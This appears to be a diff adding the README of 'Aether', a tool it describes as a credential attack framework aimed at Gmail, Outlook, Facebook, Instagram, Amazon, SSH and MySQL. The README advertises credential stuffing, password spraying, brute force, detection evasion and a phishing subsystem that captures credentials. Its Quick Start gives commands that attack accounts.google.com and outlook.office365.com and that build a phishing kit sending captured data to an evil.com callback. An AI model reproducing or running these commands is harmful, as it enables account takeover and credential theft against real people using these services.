@@ -1,0 +1,32 @@
+# Aether
+
+A production-grade, modular, async-first universal credential attack framework.
+
+## Features
+
+- **8+ High-Quality Plugins**: Gmail, Outlook, Facebook, Instagram, Amazon, Generic Form, SSH, MySQL
+- **Multiple Attack Modes**: Credential stuffing, password spraying, brute force, enumeration
+- **Evasion Systems**: Proxy rotation, browser fingerprinting, TLS fingerprint control
+- **Phishing Subsystem**: High-fidelity clones with real-time capture and validation
+- **Offline Cracker**: Hash cracking with hashcat integration
+- **Distributed**: Redis/RabbitMQ work queue support
+- **Resume Capability**: Checkpoint and resume long-running attacks
+
+## Quick Start
+
+```bash
+# Install
+pip install -r requirements.txt
+playwright install
+
+# Credential stuffing
+python -m aether stuff -p gmail -t accounts.google.com -c combos.txt
+
+# Password spray
+python -m aether spray -p outlook -t outlook.office365.com -u users.txt -w passwords.txt
+
+# Generate phishing kit
+python -m aether phish -t gmail --callback https://evil.com/capture
+
+# Crack hashes
+python -m aether crack -f hashes.txt -a sha256 -w wordlist.txt
